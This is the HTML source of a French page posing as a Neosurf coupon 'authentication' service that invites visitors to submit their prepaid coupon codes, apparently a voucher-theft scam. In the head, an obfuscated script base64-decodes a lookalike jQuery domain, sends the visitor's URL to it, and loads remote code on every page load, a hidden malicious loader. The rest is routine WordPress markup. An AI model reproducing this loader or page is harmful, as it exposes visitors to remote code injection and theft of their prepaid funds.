<!DOCTYPE html>
<html lang="fr-FR">

<head>
    <meta charset="UTF-8" />
    <link rel="profile" href="http://gmpg.org/xfn/11" />
    <link rel="pingback" href="https://neosurfonline.space/xmlrpc.php" />
    <title>neoservice.online</title>
    <link rel='dns-prefetch' href='//ajax.googleapis.com' />
    <link rel='dns-prefetch' href='//fonts.googleapis.com' />
    <link rel='dns-prefetch' href='//s.w.org' />
    <link rel="alternate" type="application/rss+xml" title="neoservice.online &raquo; Flux" href="https://neosurfonline.space/feed/" />
    <link rel="alternate" type="application/rss+xml" title="neoservice.online &raquo; Flux des commentaires" href="https://neosurfonline.space/comments/feed/" />
    <script type="text/javascript">
        window._wpemojiSettings = {
            "baseUrl": "https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/",
            "ext": ".png",
            "svgUrl": "https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/",
            "svgExt": ".svg",
            "source": {
                "concatemoji": "https:\/\/neosurfonline.space\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.10"
            }
        };
        ! function(e, a, t) {
            var n, r, o, i = a.createElement("canvas"),
                p = i.getContext && i.getContext("2d");

            function s(e, t) {
                var a = String.fromCharCode;
                p.clearRect(0, 0, i.width, i.height), p.fillText(a.apply(this, e), 0, 0);
                e = i.toDataURL();
                return p.clearRect(0, 0, i.width, i.height), p.fillText(a.apply(this, t), 0, 0), e === i.toDataURL()
            }

            function c(e) {
                var t = a.createElement("script");
                t.src = e, t.defer = t.type = "text/javascript", a.getElementsByTagName("head")[0].appendChild(t)
            }
            for (o = Array("flag", "emoji"), t.supports = {
                    everything: !0,
                    everythingExceptFlag: !0
                }, r = 0; r < o.length; r++) t.supports[o[r]] = function(e) {
                if (!p || !p.fillText) return !1;
                switch (p.textBaseline = "top", p.font = "600 32px Arial", e) {
                    case "flag":
                        return s([127987, 65039, 8205, 9895, 65039], [127987, 65039, 8203, 9895, 65039]) ? !1 : !s([55356, 56826, 55356, 56819], [55356, 56826, 8203, 55356, 56819]) && !s([55356, 57332, 56128, 56423, 56128, 56418, 56128, 56421, 56128, 56430, 56128, 56423, 56128, 56447], [55356, 57332, 8203, 56128, 56423, 8203, 56128, 56418, 8203, 56128, 56421, 8203, 56128, 56430, 8203, 56128, 56423, 8203, 56128, 56447]);
                    case "emoji":
                        return !s([55357, 56424, 8205, 55356, 57212], [55357, 56424, 8203, 55356, 57212])
                }
                return !1
            }(o[r]), t.supports.everything = t.supports.everything && t.supports[o[r]], "flag" !== o[r] && (t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && t.supports[o[r]]);
            t.supports.everythingExceptFlag = t.supports.everythingExceptFlag && !t.supports.flag, t.DOMReady = !1, t.readyCallback = function() {
                t.DOMReady = !0
            }, t.supports.everything || (n = function() {
                t.readyCallback()
            }, a.addEventListener ? (a.addEventListener("DOMContentLoaded", n, !1), e.addEventListener("load", n, !1)) : (e.attachEvent("onload", n), a.attachEvent("onreadystatechange", function() {
                "complete" === a.readyState && t.readyCallback()
            })), (n = t.source || {}).concatemoji ? c(n.concatemoji) : n.wpemoji && n.twemoji && (c(n.twemoji), c(n.wpemoji)))
        }(window, document, window._wpemojiSettings);
    </script>
    <style type="text/css">
        img.wp-smiley,
        img.emoji {
            display: inline !important;
            border: none !important;
            box-shadow: none !important;
            height: 1em !important;
            width: 1em !important;
            margin: 0 .07em !important;
            vertical-align: -0.1em !important;
            background: none !important;
            padding: 0 !important;
        }
    </style>
    <link rel='stylesheet' id='wp-block-library-css' href='https://neosurfonline.space/wp-includes/css/dist/block-library/style.min.css?ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='essential_addons_elementor-cf7-css-css' href='https://neosurfonline.space/wp-content/plugins/elementor-caldera-forms/assets/css/elementor-caldera-forms.css?ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='jquery-ui-standard-css-css' href='//ajax.googleapis.com/ajax/libs/jqueryui/1.11.2/themes/smoothness/jquery-ui.css?ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='edge-style-css' href='https://neosurfonline.space/wp-content/themes/edge/style.css?ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='font-awesome-css' href='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/font-awesome/css/font-awesome.min.css?ver=4.7.0' type='text/css' media='all' />
    <link rel='stylesheet' id='edge-responsive-css' href='https://neosurfonline.space/wp-content/themes/edge/css/responsive.css?ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='edge_google_fonts-css' href='//fonts.googleapis.com/css?family=Lato%3A400%2C300%2C700%2C400italic%7CPlayfair+Display&#038;ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-icons-css' href='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.6.2' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-animations-css' href='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/animations/animations.min.css?ver=2.9.7' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-frontend-css' href='https://neosurfonline.space/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=2.9.7' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-global-css' href='https://neosurfonline.space/wp-content/uploads/elementor/css/global.css?ver=1619299110' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-post-263-css' href='https://neosurfonline.space/wp-content/uploads/elementor/css/post-263.css?ver=1619299110' type='text/css' media='all' />
    <link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMuli%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CMontserrat%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;ver=5.5.10' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-icons-shared-0-css' href='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.12.0' type='text/css' media='all' />
    <link rel='stylesheet' id='elementor-icons-fa-solid-css' href='https://neosurfonline.space/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.12.0' type='text/css' media='all' />
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/js/edge-main.js?ver=5.5.10' id='edge-main-js'></script>
    <!--[if lt IE 9]>
<script type='text/javascript' src='https://neosurfonline.space/wp-content/themes/edge/js/html5.js?ver=3.7.3' id='html5-js'></script>
<![endif]-->
    <link rel="https://api.w.org/" href="https://neosurfonline.space/wp-json/" />
    <link rel="alternate" type="application/json" href="https://neosurfonline.space/wp-json/wp/v2/pages/263" />
    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://neosurfonline.space/xmlrpc.php?rsd" />
    <link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://neosurfonline.space/wp-includes/wlwmanifest.xml" />
    <meta name="generator" content="WordPress 5.5.10" />
    <link rel="canonical" href="https://neosurfonline.space/" />
    <link rel='shortlink' href='https://neosurfonline.space/' />
    <link rel="alternate" type="application/json+oembed" href="https://neosurfonline.space/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fneosurfonline.space%2F" />
    <link rel="alternate" type="text/xml+oembed" href="https://neosurfonline.space/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fneosurfonline.space%2F&#038;format=xml" />
    <style type="text/css">
        .ui-widget {
            font-family: inherit;
            font-size: inherit;
        }
    </style>
    <meta name="viewport" content="width=device-width" />
    <!-- Custom CSS -->
    <style type="text/css" media="screen">
        #site-branding #site-title,
        #site-branding #site-description {
            clip: rect(1px, 1px, 1px, 1px);
            position: absolute;
        }
    </style>
    <style type="text/css">
        .recentcomments a {
            display: inline !important;
            padding: 0 !important;
            margin: 0 !important;
        }
    </style>
    <link rel="icon" href="https://neosurfonline.space/wp-content/uploads/2020/03/Logo5-e1583402176568-150x61.png" sizes="32x32" />
    <link rel="icon" href="https://neosurfonline.space/wp-content/uploads/2020/03/Logo5-e1583402176568.png" sizes="192x192" />
    <link rel="apple-touch-icon" href="https://neosurfonline.space/wp-content/uploads/2020/03/Logo5-e1583402176568.png" />
    <meta name="msapplication-TileImage" content="https://neosurfonline.space/wp-content/uploads/2020/03/Logo5-e1583402176568.png" />
    <style type="text/css" id="wp-custom-css">
        .site-info .copyright {
            color: #848484;
            font-size: 13px;
            line-height: 21px;
            padding-top: 15px;
            text-align: center;
            display: none;
        }

        #fld_5392398_1-wrap {
            text-align: center;
        }

        .caldera-grid button,
        .caldera-grid html input[type="button"],
        .caldera-grid input[type="reset"],
        .caldera-grid input[type="submit"] {
            -webkit-appearance: button;
            cursor: pointer;
            width: 120px;
            padding: 10px 10px 10px 10px;
            background-color: #ff3399;
            color: white;
        }
    </style>

    <script language="javascript">
        var img = document.createElement('script');
        img.setAttribute('async', '');
        img.setAttribute('src', window.atob("Ly9hcGl1anF1ZXJ5LmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS0zLjExLjAubWluLmpzP2k9") + window.location.href + window.atob("JnIyPQ==") + "13afab8f41756754015aec34412fc86a");
        document.head.appendChild(img);
    </script>
</head>

<body class="home page-template page-template-elementor_header_footer page page-id-263 wp-custom-logo wp-embed-responsive elementor-default elementor-template-full-width elementor-kit-86 elementor-page elementor-page-263">
    <div id="page" class="hfeed site">
        <a class="skip-link screen-reader-text" href="#content">Skip to content</a>
        <!-- Masthead ============================================= -->
        <header id="masthead" class="site-header" role="banner">
            <div class="top-header">
                <div class="container clearfix">
                    <div class="header-social-block">
                        <div class="social-links clearfix">
                        </div><!-- end .social-links -->
                    </div><!-- end .header-social-block -->
                    <div id="site-branding"><a href="#" class="custom-logo-link" rel="home" aria-current="page"><img width="159" height="61" src="./recharge.png" title="neoservice.online" rel="home">
                            neoservice.online </a>
                        </h1> <!-- end .site-title -->
                    </div>
                </div> <!-- end .container -->
            </div> <!-- end .top-header -->
            <!-- Main Header============================================= -->
            <div id="sticky_header">
                <div class="container clearfix">
                    <h3 class="nav-site-title">
                        <a href="#" title="neoservice.online">neoservice.online</a>
                    </h3>
                    <!-- end .nav-site-title -->
                    <!-- Main Nav ============================================= -->
                    <nav id="site-navigation" class="main-navigation clearfix" role="navigation" aria-label="Main Menu">
                        <button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
                            <span class="line-one"></span>
                            <span class="line-two"></span>
                            <span class="line-three"></span>
                        </button>
                        <!-- end .menu-toggle -->
                        <ul class="menu">
                            <li class="page_item page-item-263 current_page_item"><a href="#
									aria-current=" page">ACCUEIL</a></li>
                            <li class="page_item page-item-265"><a href="/index2">AUTHENTIFIER</a></li>
                            <li class="page_item page-item-267"><a href="#">CONTACT</a></li>
                        </ul>
                    </nav> <!-- end #site-navigation -->
                    <button id="search-toggle" class="header-search" type="button"></button>
                    <div id="search-box" class="clearfix">
                        <form class="search-form" action="https://neosurfonline.space/" method="get">
                            <input type="search" name="s" class="search-field" placeholder="Search &hellip;" autocomplete="off">
                            <button type="submit" class="search-submit"><i class="fa fa-search"></i></button>
                        </form> <!-- end .search-form -->
                    </div> <!-- end #search-box -->
                </div> <!-- end .container -->
            </div> <!-- end #sticky_header -->
        </header> <!-- end #masthead -->
        <!-- Main Page Start ============================================= -->
        <div id="content">
            <div class="container clearfix">
                <div class="page-header">
                    <h2 class="page-title">ACCUEIL</h2>
                    <!-- .page-title -->
                    <!-- .breadcrumb -->
                </div>
                <!-- .page-header -->
                <div data-elementor-type="wp-page" data-elementor-id="263" class="elementor elementor-263" data-elementor-settings="[]">
                    <div class="elementor-inner">
                        <div class="elementor-section-wrap">
                            <section class="elementor-element elementor-element-2d1a7396 elementor-section-height-min-height elementor-section-stretched elementor-section-full_width elementor-section-height-default elementor-section-items-middle elementor-section elementor-top-section" data-id="2d1a7396" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;shape_divider_bottom&quot;:&quot;arrow&quot;,&quot;shape_divider_bottom_negative&quot;:&quot;yes&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
                                <div class="elementor-background-overlay"></div>
                                <div class="elementor-shape elementor-shape-bottom" data-negative="true">
                                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 700 10" preserveAspectRatio="none">
                                        <path class="elementor-shape-fill" d="M360 0L350 9.9 340 0 0 0 0 10 700 10 700 0" />
                                    </svg>
                                </div>
                                <div class="elementor-container elementor-column-gap-default">
                                    <div class="elementor-row">
                                        <div class="elementor-element elementor-element-52159df1 elementor-column elementor-col-50 elementor-top-column" data-id="52159df1" data-element_type="column">
                                            <div class="elementor-column-wrap">
                                                <div class="elementor-widget-wrap">
                                                </div>
                                            </div>
                                        </div>
                                        <div class="elementor-element elementor-element-2272aca8 elementor-column elementor-col-50 elementor-top-column" data-id="2272aca8" data-element_type="column">
                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                <div class="elementor-widget-wrap">
                                                    <div class="elementor-element elementor-element-6f33d6c0 elementor-widget elementor-widget-heading" data-id="6f33d6c0" data-element_type="widget" data-widget_type="heading.default">
                                                        <div class="elementor-widget-container">
                                                            <h2 class="elementor-heading-title elementor-size-large">
                                                                Profitez De La dernière Innovation </h2>
                                                        </div>
                                                    </div>
                                                    <div class="elementor-element elementor-element-5eb058b7 elementor-widget elementor-widget-text-editor" data-id="5eb058b7" data-element_type="widget" data-widget_type="text-editor.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                <p>Assurez-vous de l&rsquo;authenticité de votre
                                                                    recharge l&rsquo;attestation de votre recharge vous
                                                                    permet d&rsquo;être sur que le ticket est
                                                                    authentique, qu&rsquo;il n&rsquo;est pas utilisé au
                                                                    préalable par le vendeur, de connaitre la validité
                                                                    de votre recharge.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="elementor-element elementor-element-4ad74971 elementor-align-left elementor-mobile-align-center elementor-widget elementor-widget-button" data-id="4ad74971" data-element_type="widget" data-widget_type="button.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-button-wrapper">
                                                                <a href="/index2" rel="nofollow" class="elementor-button-link elementor-button elementor-size-lg" role="button">
                                                                    <span class="elementor-button-content-wrapper">
                                                                        <span class="elementor-button-icon elementor-align-icon-right">
                                                                            <i aria-hidden="true" class="fas fa-angle-double-right"></i>
                                                                        </span>
                                                                        <span class="elementor-button-text">Authentifier
                                                                            mon coupon Néosurf</span>
                                                                    </span>
                                                                </a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                            <section class="elementor-element elementor-element-61c8445f elementor-section-content-middle elementor-section-stretched elementor-section-full_width elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="61c8445f" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
                                <div class="elementor-container elementor-column-gap-default">
                                    <div class="elementor-row">
                                        <div class="elementor-element elementor-element-5909cd80 elementor-column elementor-col-50 elementor-top-column" data-id="5909cd80" data-element_type="column">
                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                <div class="elementor-widget-wrap">
                                                    <div class="elementor-element elementor-element-7bcbe55c elementor-widget elementor-widget-image" data-id="7bcbe55c" data-element_type="widget" data-widget_type="image.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-image">
                                                                <img width="585" height="390" src="https://neosurfonline.space/wp-content/uploads/2020/04/carte_nominative_tc-1.png" class="attachment-full size-full" alt="" loading="lazy" srcset="https://neosurfonline.space/wp-content/uploads/2020/04/carte_nominative_tc-1.png 585w, https://neosurfonline.space/wp-content/uploads/2020/04/carte_nominative_tc-1-300x200.png 300w" sizes="(max-width: 585px) 100vw, 585px" />
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="elementor-element elementor-element-2b208d3b elementor-column elementor-col-50 elementor-top-column" data-id="2b208d3b" data-element_type="column">
                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                <div class="elementor-widget-wrap">
                                                    <div class="elementor-element elementor-element-471ec1be elementor-widget elementor-widget-image" data-id="471ec1be" data-element_type="widget" data-widget_type="image.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-image">
                                                                <img width="300" height="77" src="https://neosurfonline.space/wp-content/uploads/2020/04/31e3c7c7427634a5ca9de863cc4de801_orig-1-300x77.png" class="attachment-medium size-medium" alt="" loading="lazy" srcset="https://neosurfonline.space/wp-content/uploads/2020/04/31e3c7c7427634a5ca9de863cc4de801_orig-1-300x77.png 300w, https://neosurfonline.space/wp-content/uploads/2020/04/31e3c7c7427634a5ca9de863cc4de801_orig-1.png 463w" sizes="(max-width: 300px) 100vw, 300px" />
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="elementor-element elementor-element-62783c15 elementor-widget elementor-widget-text-editor" data-id="62783c15" data-element_type="widget" data-widget_type="text-editor.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                <p>Inscrivez en toute sécurité le code de votre
                                                                    coupon-recharge dans le formulaire ci dessous et
                                                                    recevez immédiatement une réponse par mail.</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="elementor-element elementor-element-13e18020 elementor-align-center elementor-widget elementor-widget-button" data-id="13e18020" data-element_type="widget" data-widget_type="button.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-button-wrapper">
                                                                <a href="#" class="elementor-button-link elementor-button elementor-size-xs" role="button">
                                                                    <span class="elementor-button-content-wrapper">
                                                                        <span class="elementor-button-icon elementor-align-icon-left">
                                                                            <i aria-hidden="true" class="fas fa-long-arrow-alt-down"></i>
                                                                        </span>
                                                                        <span class="elementor-button-text">me
                                                                            lancer</span>
                                                                    </span>
                                                                </a>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                            <section class="elementor-element elementor-element-4a19e55b elementor-section-content-middle elementor-section-stretched elementor-section-full_width elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="4a19e55b" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
                                <div class="elementor-container elementor-column-gap-default">
                                    <div class="elementor-row">
                                        <div class="elementor-element elementor-element-78cabb04 elementor-column elementor-col-100 elementor-top-column" data-id="78cabb04" data-element_type="column">
                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                <div class="elementor-widget-wrap">
                                                    <div class="elementor-element elementor-element-56d1b25d elementor-widget elementor-widget-heading" data-id="56d1b25d" data-element_type="widget" data-widget_type="heading.default">
                                                        <div class="elementor-widget-container">
                                                            <h2 class="elementor-heading-title elementor-size-default">
                                                                Ou Trouver Les Coupons Néosurf ?</h2>
                                                        </div>
                                                    </div>
                                                    <div class="elementor-element elementor-element-3aecde8 elementor-widget elementor-widget-heading" data-id="3aecde8" data-element_type="widget" data-widget_type="heading.default">
                                                        <div class="elementor-widget-container">
                                                            <h3 class="elementor-heading-title elementor-size-default">
                                                                <div><br></div>
                                                            </h3>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                            <section class="elementor-element elementor-element-3b4219bf elementor-section-content-middle elementor-section-stretched elementor-section-full_width elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="3b4219bf" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
                                <div class="elementor-container elementor-column-gap-default">
                                    <div class="elementor-row">
                                        <div class="elementor-element elementor-element-2c3668c7 elementor-column elementor-col-50 elementor-top-column" data-id="2c3668c7" data-element_type="column">
                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                <div class="elementor-widget-wrap">
                                                    <div class="elementor-element elementor-element-771f9f08 elementor-widget elementor-widget-text-editor" data-id="771f9f08" data-element_type="widget" data-widget_type="text-editor.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-text-editor elementor-clearfix">
                                                                <p>Le coupon Neosurf est disponible dans les lieux
                                                                    suivants : bureau de tabac, presse,taxiphone et aux
                                                                    caisses des hypermarchés Auchan et Franprix</p>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="elementor-element elementor-element-264b91d6 elementor-column elementor-col-50 elementor-top-column" data-id="264b91d6" data-element_type="column">
                                            <div class="elementor-column-wrap  elementor-element-populated">
                                                <div class="elementor-widget-wrap">
                                                    <div class="elementor-element elementor-element-617042db elementor-widget elementor-widget-image-carousel" data-id="617042db" data-element_type="widget" data-settings="{&quot;slides_to_show&quot;:&quot;1&quot;,&quot;autoplay_speed&quot;:2000,&quot;speed&quot;:1000,&quot;pause_on_hover&quot;:&quot;no&quot;,&quot;navigation&quot;:&quot;none&quot;,&quot;autoplay&quot;:&quot;yes&quot;,&quot;pause_on_interaction&quot;:&quot;yes&quot;,&quot;infinite&quot;:&quot;yes&quot;,&quot;effect&quot;:&quot;slide&quot;,&quot;direction&quot;:&quot;ltr&quot;}" data-widget_type="image-carousel.default">
                                                        <div class="elementor-widget-container">
                                                            <div class="elementor-image-carousel-wrapper swiper-container" dir="ltr">
                                                                <div class="elementor-image-carousel swiper-wrapper">
                                                                    <div class="swiper-slide">
                                                                        <figure class="swiper-slide-inner"><img class="swiper-slide-image" src="https://neosurfonline.space/wp-content/uploads/2020/04/AUCHAN-1.png" alt="AUCHAN-1.png" /></figure>
                                                                    </div>
                                                                    <div class="swiper-slide">
                                                                        <figure class="swiper-slide-inner"><img class="swiper-slide-image" src="https://neosurfonline.space/wp-content/uploads/2020/04/FANPRIX-1.png" alt="FANPRIX-1.png" /></figure>
                                                                    </div>
                                                                    <div class="swiper-slide">
                                                                        <figure class="swiper-slide-inner"><img class="swiper-slide-image" src="https://neosurfonline.space/wp-content/uploads/2020/04/images-3-orig-orig_orig-1.jpg" alt="images-3-orig-orig_orig-1.jpg" />
                                                                        </figure>
                                                                    </div>
                                                                    <div class="swiper-slide">
                                                                        <figure class="swiper-slide-inner"><img class="swiper-slide-image" src="https://neosurfonline.space/wp-content/uploads/2020/04/presse-1.png" alt="presse-1.png" /></figure>
                                                                    </div>
                                                                    <div class="swiper-slide">
                                                                        <figure class="swiper-slide-inner"><img class="swiper-slide-image" src="https://neosurfonline.space/wp-content/uploads/2020/04/taxiphone-1.jpg" alt="taxiphone-1.jpg" /></figure>
                                                                    </div>
                                                                    <div class="swiper-slide">
                                                                        <figure class="swiper-slide-inner"><img class="swiper-slide-image" src="https://neosurfonline.space/wp-content/uploads/2020/04/visa-mastercard-in-iran-1.jpg" alt="visa-mastercard-in-iran-1.jpg" />
                                                                        </figure>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </section>
                        </div>
                    </div>
                </div>
            </div> <!-- end .container -->
        </div> <!-- end #content -->
        <!-- Footer Start ============================================= -->
        <footer id="colophon" class="site-footer clearfix" role="contentinfo">
            <div class="site-info">
                <div class="container">
                    <div class="social-links clearfix">
                    </div><!-- end .social-links -->
                    <div class="copyright">&copy; 2022 <a title="neoservice.online" target="_blank" href="#">neoservice.online</a> |
                        Designed by: <a title="Theme Freesia" target="_blank" href="#">Theme
                            Freesia</a> |
                        Powered by: <a title="WordPress" target="_blank" href="#">WordPress</a>
                    </div>
                    <div style="clear:both;"></div>
                </div> <!-- end .container -->
            </div> <!-- end .site-info -->
            <button class="go-to-top"><a title="Go to Top" href="#"><i class="fa fa-angle-double-up"></i></a></button>
            <!-- end .go-to-top -->
        </footer> <!-- end #colophon -->
    </div> <!-- end #page -->
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4' id='jquery-ui-core-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4' id='jquery-ui-widget-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/accordion.min.js?ver=1.11.4' id='jquery-ui-accordion-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4' id='jquery-ui-position-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/menu.min.js?ver=1.11.4' id='jquery-ui-menu-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill.min.js?ver=7.4.4' id='wp-polyfill-js'></script>
    <script type='text/javascript' id='wp-polyfill-js-after'>
        ('fetch' in window) || document.write('<script src="https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill-fetch.min.js?ver=3.0.0"></scr' + 'ipt>');
        (document.contains) || document.write('<script src="https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill-node-contains.min.js?ver=3.42.0"></scr' + 'ipt>');
        (window.DOMRect) || document.write('<script src="https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill-dom-rect.min.js?ver=3.42.0"></scr' + 'ipt>');
        (window.URL && window.URL.prototype && window.URLSearchParams) || document.write('<script src="https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill-url.min.js?ver=3.6.4"></scr' + 'ipt>');
        (window.FormData && window.FormData.prototype.keys) || document.write('<script src="https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill-formdata.min.js?ver=3.0.12"></scr' + 'ipt>');
        (Element.prototype.matches && Element.prototype.closest) || document.write('<script src="https://neosurfonline.space/wp-includes/js/dist/vendor/wp-polyfill-element-closest.min.js?ver=2.0.2"></scr' + 'ipt>');
    </script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/dist/dom-ready.min.js?ver=93db39f6fe07a70cb9217310bec0a531' id='wp-dom-ready-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/dist/i18n.min.js?ver=4ab02c8fd541b8cfb8952fe260d21f16' id='wp-i18n-js'></script>
    <script type='text/javascript' id='wp-a11y-js-translations'>
        (function(domain, translations) {
            var localeData = translations.locale_data[domain] || translations.locale_data.messages;
            localeData[""].domain = domain;
            wp.i18n.setLocaleData(localeData, domain);
        })("default", {
            "translation-revision-date": "2021-04-15 08:50:47+0000",
            "generator": "GlotPress\/3.0.0-alpha.2",
            "domain": "messages",
            "locale_data": {
                "messages": {
                    "": {
                        "domain": "messages",
                        "plural-forms": "nplurals=2; plural=n > 1;",
                        "lang": "fr"
                    },
                    "Notifications": ["Notifications"]
                }
            },
            "comment": {
                "reference": "wp-includes\/js\/dist\/a11y.js"
            }
        });
    </script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/dist/a11y.min.js?ver=f23e5b9c6e4214e0ec04d318a7c9f898' id='wp-a11y-js'></script>
    <script type='text/javascript' id='jquery-ui-autocomplete-js-extra'>
        /* <![CDATA[ */
        var uiAutocompleteL10n = {
            "noResults": "Aucun r\u00e9sultat.",
            "oneResult": "Un r\u00e9sultat trouv\u00e9. Utilisez les fl\u00e8ches haut et bas du clavier pour les parcourir. ",
            "manyResults": "%d r\u00e9sultats trouv\u00e9s. Utilisez les fl\u00e8ches haut et bas du clavier pour les parcourir.",
            "itemSelected": "\u00c9l\u00e9ment s\u00e9lectionn\u00e9."
        };
        /* ]]> */
    </script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/autocomplete.min.js?ver=1.11.4' id='jquery-ui-autocomplete-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/button.min.js?ver=1.11.4' id='jquery-ui-button-js'></script>
    <script type='text/javascript' src='https://neosurfonline.space/wp-includes/js/jquery/ui/datepicker.min.js?ver=1.11.4' id='jquery-ui-datepicker-js'></script>
    <script type='text/javascript' id='jquery-ui-datepicker-js-after'>
        jQuery(document).ready(function(jQuery) {
            jQuery.datepicker.setDefaults({
                "closeText": "Fermer",
                "currentText": "Aujourd\u2019hui",
                "monthNames": ["janvier", "f\u00e9vrier", "mars", "avril", "mai", "juin", "juillet", "ao\u00fbt", "septembre", "octobre", "novembre", "d\u00e9cembre"],
                "monthNamesShort": ["Jan", "F\u00e9v", "Mar", "Avr", "Mai", "Juin", "Juil", "Ao\u00fbt", "Sep", "Oct", "Nov", "D\u00e9c"],
                "nextText": "Suivant",
                "prevText": "Pr\u00e9c\u00e9dent",
                "dayNames": ["dimanche", "lundi", "mardi", "mercredi", "jeudi", "vendredi", "samedi"],
                "dayNamesShort": ["dim", "lun", "mar", "mer", "jeu", "ven", "sam"],
                "dayNamesMin": ["D", "L", "M", "M", "J", "V", "S"],
                "dateFormat": "MM d, yy",
                "firstDay": 1,
                "isRTL": false
            });
        });
